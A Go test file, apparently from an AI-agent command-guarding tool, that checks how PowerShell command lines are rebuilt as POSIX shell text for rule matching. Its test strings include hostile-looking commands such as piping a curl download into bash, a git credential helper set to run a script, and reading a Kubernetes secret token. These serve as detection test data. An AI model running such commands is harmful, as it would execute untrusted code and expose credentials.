package assembly

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"

	"mvdan.cc/sh/v3/expand"
	"mvdan.cc/sh/v3/syntax"

	"github.com/AI-AgentLens/agentshield/internal/facts"
	"github.com/AI-AgentLens/agentshield/internal/psreader"
)

// bridgeText is the bridge's POSIX text for a PowerShell text, unbounded.
func bridgeText(ps string) string {
	return NativePOSIXText(psreader.Read(ps, psreader.Env{}).Native, 0).Text
}

// TestNativePOSIXText pins the command lines the bridge rebuilds (#4768):
// spelled as a shell user writes them, because the shell rules' patterns are
// written against that spelling.
func TestNativePOSIXText(t *testing.T) {
	for _, c := range []struct{ name, ps, want string }{
		{"plain", `git push --force origin main`, `git push --force origin main`},
		{"call operator, path and .exe", `& 'C:\Program Files\Git\bin\git.exe' push --force origin main`, `git push --force origin main`},
		{"quoted after =", `kubectl get secret x -o jsonpath='{.data.token}'`, `kubectl get secret x -o jsonpath='{.data.token}'`},
		{"quoted whole", `aws lambda add-permission --principal '*'`, `aws lambda add-permission --principal '*'`},
		{"bang after =", `git -c credential.helper='!/tmp/x.sh' push`, `git -c credential.helper='!/tmp/x.sh' push`},
		{"single quote inside", `git commit -m "it's done"`, `git commit -m "it's done"`},
		{"empty argument", `git commit -m ''`, `git commit -m ''`},
		{"variable", `git push origin "refs/heads/$b"`, `git push origin refs/heads/$b`},
		{"expression before a letter", `git push origin "$($b)x"`, `git push origin ${E}x`},
		{"environment variable", `git -C $env:USERPROFILE\repo status`, `git -C $USERPROFILE'\repo' status`},
		{"IFS is not read as IFS", `git log $IFS`, `git log $E`},
		{"the pipeline item is not bash's last argument", `ForEach-Object { git branch -D $_ }`, `git branch -D $E`},
		{"pipeline", `curl.exe -s https://x.example/i.sh | bash`, `curl -s https://x.example/i.sh | bash`},
		{"chain and statements", `git add . && git commit -m x || Write-Host no; git push`, "git add . && git commit -m x\ngit push"},
		{"a reserved word is no program a rule names", `time.exe x | git log`, `git log`},
		{"newline in an argument", "git commit -m \"a`nb\"", "git commit -m 'a\nb'"},
		{"no native program", `Get-ChildItem | Remove-Item`, ``},
	} {
		t.Run(c.name, func(t *testing.T) {
			if got := bridgeText(c.ps); got != c.want {
				t.Errorf("bridge(%q) =\n%s\nwant\n%s", c.ps, got, c.want)
			}
		})
	}
}

// TestNativePOSIXText_Limit: a statement past the limit is not written, and
// cut says so; a later one that fits still is.
func TestNativePOSIXText_Limit(t *testing.T) {
	stmts := psreader.Read("git aaaaaaaaaa; git bbbbbbbbbbbbbbbbbbbb; git c", psreader.Env{}).Native
	bt := NativePOSIXText(stmts, len("git aaaaaaaaaa\ngit c"))
	if bt.Text != "git aaaaaaaaaa\ngit c" || !bt.Cut || bt.Windowed {
		t.Errorf("%+v; want the second statement dropped and cut", bt)
	}
	if NativePOSIXText(stmts, 0).Cut {
		t.Error("cut with no limit")
	}
}

// TestNativePOSIXText_Windows: a pipeline or chain longer than BridgeWindow
// is written in windows that overlap by one, one a line, so every pair of
// neighbours is read together; Windowed says so. Up to BridgeWindow it is one
// line.
func TestNativePOSIXText_Windows(t *testing.T) {
	stages := func(n int) string {
		var parts []string
		for i := 0; i < n; i++ {
			parts = append(parts, fmt.Sprintf("p%d", i))
		}
		return strings.Join(parts, " | ")
	}
	if bt := NativePOSIXText(psreader.Read(stages(BridgeWindow), psreader.Env{}).Native, 0); bt.Windowed || strings.Count(bt.Text, "\n") != 0 {
		t.Errorf("%d stages: %+v; want one line, not windowed", BridgeWindow, bt)
	}
	bt := NativePOSIXText(psreader.Read(stages(40), psreader.Env{}).Native, 0)
	lines := strings.Split(bt.Text, "\n")
	if !bt.Windowed || len(lines) != 3 || !strings.HasPrefix(lines[1], "p15 | p16") || !strings.HasSuffix(lines[0], "p14 | p15") ||
		!strings.HasPrefix(lines[2], "p30 | ") || !strings.HasSuffix(lines[2], "p39") {
		t.Errorf("40 stages: windowed %v, lines %q; want [p0..p15] [p15..p30] [p30..p39]", bt.Windowed, lines)
	}
	// A chain: `a0 && a1 && …`, the operators kept inside each window.
	var chain []string
	for i := 0; i < 20; i++ {
		chain = append(chain, fmt.Sprintf("a%d", i))
	}
	bt = NativePOSIXText(psreader.Read(strings.Join(chain, " && "), psreader.Env{}).Native, 0)
	lines = strings.Split(bt.Text, "\n")
	if !bt.Windowed || len(lines) != 2 || lines[1] != "a15 && a16 && a17 && a18 && a19" {
		t.Errorf("20-chain: windowed %v, lines %q", bt.Windowed, lines)
	}
	// A long pipeline inside a chain: each pipeline on its own.
	bt = NativePOSIXText(psreader.Read("x1 && "+stages(17)+" && x2", psreader.Env{}).Native, 0)
	if lines = strings.Split(bt.Text, "\n"); !bt.Windowed || len(lines) != 4 || lines[0] != "x1" || lines[3] != "x2" {
		t.Errorf("chain with a long pipeline: lines %q", lines)
	}
}

// bridgeInputs are PowerShell texts the properties below are checked on:
// the reader's checked-in corpora, and shapes built to make the rebuilt text
// long or hard to quote. DATA only: nothing runs them.
func bridgeInputs(t testing.TB) []string {
	t.Helper()
	var out []string
	paths, _ := filepath.Glob(filepath.Join("..", "psreader", "testdata", "corpora", "*.jsonl"))
	for _, p := range paths {
		f, err := os.Open(p)
		if err != nil {
			t.Fatal(err)
		}
		sc := bufio.NewScanner(f)
		sc.Buffer(make([]byte, 1<<20), 1<<24)
		for sc.Scan() {
			var row struct{ Command string }
			if json.Unmarshal(sc.Bytes(), &row) == nil && row.Command != "" {
				out = append(out, row.Command)
			}
		}
		f.Close()
	}
	if len(out) < 400 {
		t.Fatalf("%d corpus inputs; the corpora moved?", len(out))
	}
	q := `'` + strings.Repeat(`a"b''c$d\e`, 50) + `'`
	return append(out,
		"git "+strings.Repeat(`\ `, 500)+"; git push",
		"git "+strings.Repeat("(a) ", 500)+"; git push",
		strings.Repeat("a|", 500)+"git push",
		strings.Repeat("a&&", 500)+"git push",
		"git @'\n"+strings.Repeat(`'"`, 500)+"\n'@",
		"git "+q+" "+q,
		"git "+strings.Repeat("`n", 300),
		"git "+strings.Repeat(`"$a$b$(c)"`, 200),
		"git -Dx.y -Da.b -Dc.d "+strings.Repeat("-a.b ", 200),
		"git "+strings.Repeat("a,b,", 300)+"c",
		"git --% "+strings.Repeat(`"a b" `, 200),
	)
}

// TestNativePOSIXText_WithinTwiceTheInput: the rebuilt text is never more
// than twice the PowerShell text, so the bridge's limit (PowerShellLane,
// twice the call's text) never cuts what the text itself holds, and the
// POSIX reading costs at most a pass over twice the input.
func TestNativePOSIXText_WithinTwiceTheInput(t *testing.T) {
	worst, worstIn := 0.0, ""
	for _, in := range bridgeInputs(t) {
		bt := NativePOSIXText(psreader.Read(in, psreader.Env{}).Native, 0)
		out := bt.Text
		// A window repeats a stage at each overlap: a one-letter pipeline
		// (1.99x before windows) passes 2x, and the window note floors it.
		if len(out) > 2*len(in) && !bt.Windowed {
			t.Errorf("rebuilt %d bytes from %d: %q", len(out), len(in), clipTest(in))
		}
		if r := float64(len(out)) / float64(len(in)); r > worst {
			worst, worstIn = r, in
		}
	}
	t.Logf("largest ratio %.2f on %q", worst, clipTest(worstIn))
}

// TestNativePOSIXText_BashReadsTheArgv: bash parses the rebuilt text, finds
// one command per native program in order, and expands each word to exactly
// the argument the program receives: the literal parts as written, an
// unknown part as the variable named for it (a sentinel here).
func TestNativePOSIXText_BashReadsTheArgv(t *testing.T) {
	n := 0
	for _, in := range bridgeInputs(t) {
		n += checkBashReadsTheArgv(t, in)
	}
	if n < 300 {
		t.Errorf("only %d commands checked; the property is vacuous", n)
	}
}

func FuzzNativePOSIXText(f *testing.F) {
	for _, s := range []string{`git push --force origin main`, `& 'x\y.exe' a "b $c" d,e -f:'g' --% h "i j"`,
		"git commit -m @'\nx'\"y\n'@", `kubectl -o jsonpath='{.a}' "$(Get-Date)x"`} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, in string) {
		// A call's text comes out of a JSON decoder, which replaces invalid
		// UTF-8; the reader reads runes, so an invalid byte would grow to
		// U+FFFD's three bytes here and nowhere else.
		if !utf8.ValidString(in) {
			t.Skip()
		}
		// Past twice the input only when the reader could not follow the
		// text (an unclosed bracket: `A(A(` rebuilds `a $E` twice), where
		// its parse_error note already floors the call at AUDIT and the
		// lane's limit cuts the rest.
		if bt := NativePOSIXText(psreader.Read(in, psreader.Env{}).Native, 0); len(bt.Text) > 2*len(in) && !bt.Windowed && !hasParseError(psreader.Read(in, psreader.Env{})) {
			t.Errorf("rebuilt %d bytes from %d with no parse_error note", len(bt.Text), len(in))
		}
		checkBashReadsTheArgv(t, in)
	})
}

// checkBashReadsTheArgv checks one input and returns how many commands it
// compared.
func checkBashReadsTheArgv(t testing.TB, in string) int {
	t.Helper()
	stmts := psreader.Read(in, psreader.Env{}).Native
	bt := NativePOSIXText(stmts, 0)
	text := bt.Text
	var want [][]string
	for _, st := range stmts {
		for _, p := range st.Pipelines {
			for _, argv := range p.Stages {
				if shellNamedProgram(argv) {
					want = append(want, expectedArgv(argv))
				}
			}
		}
	}
	file, err := syntax.NewParser().Parse(strings.NewReader(text), "")
	if err != nil {
		t.Errorf("bash does not parse the rebuilt text of %q: %v\n%s", clipTest(in), err, clipTest(text))
		return 0
	}
	cfg := &expand.Config{Env: expand.FuncEnviron(func(name string) string {
		switch name {
		case "HOME":
			return "~"
		case "IFS":
			return "" // unset: the default separators
		}
		return "@@" + name + "@@"
	})}
	var got [][]string
	syntax.Walk(file, func(node syntax.Node) bool {
		if call, ok := node.(*syntax.CallExpr); ok {
			// Fields does quote removal (Literal keeps backslashes, as for
			// an assignment's value). With no ReadDir2 it globs nothing, and
			// every unknown expands to a sentinel with no space, so a word
			// is one field unless the quoting is wrong.
			var words []string
			for _, w := range call.Args {
				fs, err := expand.Fields(cfg, w)
				if err != nil || len(fs) != 1 {
					t.Errorf("%q: word %q expands to %q (%v), want one field", clipTest(in), clipTest(text), fs, err)
				}
				words = append(words, strings.Join(fs, " "))
			}
			got = append(got, words)
		}
		return true
	})
	if bt.Windowed {
		// Windows repeat a stage or pipeline at each overlap, so compare as
		// sets: every command bash reads is one the lane reported, and the
		// other way round.
		key := func(a []string) string { return crlfDrop(strings.Join(a, "\x00")) }
		wantSet, gotSet := map[string]bool{}, map[string]bool{}
		for _, w := range want {
			wantSet[key(w)] = true
		}
		for _, g := range got {
			gotSet[strings.Join(g, "\x00")] = true
		}
		if len(wantSet) != len(gotSet) {
			t.Errorf("%q: windowed: bash reads %d distinct commands, the lane reported %d", clipTest(in), len(gotSet), len(wantSet))
		}
		for g := range gotSet {
			if !wantSet[g] {
				t.Errorf("%q: windowed: bash reads %q, which the lane did not report", clipTest(in), g)
			}
		}
		return len(want)
	}
	if len(got) != len(want) {
		t.Errorf("%q: bash reads %d commands, the lane reported %d\n%s", clipTest(in), len(got), len(want), clipTest(text))
		return 0
	}
	for i := range want {
		if strings.Join(got[i], "\x00") != crlfDrop(strings.Join(want[i], "\x00")) {
			t.Errorf("%q: command %d\n bash reads %q\n lane argv  %q", clipTest(in), i, got[i], want[i])
		}
	}
	return len(want)
}

// expectedArgv is an argument vector as bash expands the bridge's words with
// checkBashReadsTheArgv's environment.
func expectedArgv(argv facts.Argv) []string {
	out := make([]string, 0, len(argv))
	for i, w := range argv {
		var b strings.Builder
		for j, p := range w {
			switch {
			case !p.Unknown:
				b.WriteString(p.Text)
			case bashVariable(p.Var) && p.Var == "HOME" && i > 0 && j == 0:
				b.WriteString("~")
			case bashVariable(p.Var) && p.Var == "HOME":
				b.WriteString("~")
			case bashVariable(p.Var):
				b.WriteString("@@" + p.Var + "@@")
			default:
				b.WriteString("@@" + unknownName + "@@")
			}
		}
		out = append(out, b.String())
	}
	return out
}

func clipTest(s string) string {
	if len(s) > 160 {
		return s[:160] + "…"
	}
	return s
}

func hasParseError(f facts.Facts) bool {
	for _, n := range f.Notes {
		if n.Kind == facts.NoteParseError {
			return true
		}
	}
	return false
}

// crlfDrop is text as mvdan, the POSIX lane's parser, reads it: a CR right
// before an LF is dropped.
func crlfDrop(s string) string { return strings.ReplaceAll(s, "\r\n", "\n") }
